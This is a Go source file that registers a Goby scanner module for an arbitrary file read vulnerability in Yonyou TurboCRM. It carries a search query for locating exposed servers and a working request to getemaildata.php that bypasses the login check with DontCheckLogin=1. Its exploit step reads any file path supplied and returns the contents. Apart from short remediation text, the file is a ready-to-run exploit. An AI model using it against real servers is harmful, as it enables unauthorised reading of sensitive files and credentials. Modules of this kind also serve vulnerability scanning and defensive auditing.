package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyou TurboCRM getemaildata.php Arbitrary File Read Vulnerability",
    "Description": "<p>Founded in 1988, Yonyou is the world's leading provider of enterprise cloud services and software. Yonyou is committed to using creativity and technology to promote business and social progress, through the construction and operation of the world's leading business innovation platform - Yonyou BIP, to serve enterprise digital intelligence transformation and business innovation, achieve tens of millions of intelligent enterprises, make enterprise cloud services available on demand, make digital intelligence value everywhere, and make business innovation so convenient.</p>",
    "Product": "yonyou-TurboCRM",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2015-12-07",
    "Author": "scwl86@163.com",
    "FofaQuery": "((body=\"/pub/watchor.php\" && body=\"logocss\" && body=\"src=\\\"/js/turboui.js\") || title=\"用友TurboCRM\") || title=\"用友U8CRM\" || body=\"turboui.js\" || title=\"用友TurboCRM\"",
    "GobyQuery": "((body=\"/pub/watchor.php\" && body=\"logocss\" && body=\"src=\\\"/js/turboui.js\") || title=\"用友TurboCRM\") || title=\"用友U8CRM\" || body=\"turboui.js\" || title=\"用友TurboCRM\"",
    "Level": "1",
    "Impact": "<p>Yonyou TurboCRM getemaildata.php has an arbitrary file reading vulnerability that can lead to information disclosure</p>",
    "Recommendation": "<p>1. Upgrade the Yonyou TurboCRM system to the latest version</p><p>2. Temporarily use WAF and other means to restrict path access</p>",
    "References": [
        "715827922@qq.com"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "path",
            "type": "input",
            "value": "c:/Windows/win.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/Windows/win.ini",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "for 16-bit app support",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/ajax/getemaildata.php?DontCheckLogin=1&filePath={{{path}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": ".*",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\w\\W]+)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "用友 TurboCRM getemaildata.php 任意文件读取漏洞",
            "Product": "用友-TurboCRM",
            "Description": "<p>用友创立于1988年，是全球领先的企业云服务与软件提供商。用友致力于用创想与技术推动商业和社会进步，通过构建和运行全球领先的商业创新平台——用友BIP，服务企业数智化转型和商业创新，成就千万数智企业，让企业云服务随需而用，让数智价值无处不在，让商业创新如此便捷。<br></p>",
            "Recommendation": "<p>1、升级<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">用友 TurboCRM系统到最新版本</span></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">2、临时使用WAF等手段限制路径访问</span></p>",
            "Impact": "<p>用友 TurboCRM getemaildata.php 存在任意文件读取漏洞可导致信息泄露<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Yonyou TurboCRM getemaildata.php Arbitrary File Read Vulnerability",
            "Product": "yonyou-TurboCRM",
            "Description": "<p>Founded in 1988, Yonyou is the world's leading provider of enterprise cloud services and software. Yonyou is committed to using creativity and technology to promote business and social progress, through the construction and operation of the world's leading business innovation platform - Yonyou BIP, to serve enterprise digital intelligence transformation and business innovation, achieve tens of millions of intelligent enterprises, make enterprise cloud services available on demand, make digital intelligence value everywhere, and make business innovation so convenient.<br></p>",
            "Recommendation": "<p>1. Upgrade the Yonyou TurboCRM system to the latest version</p><p>2. Temporarily use WAF and other means to restrict path access</p>",
            "Impact": "<p>Yonyou TurboCRM getemaildata.php has an arbitrary file reading vulnerability that can lead to information disclosure<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9960"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}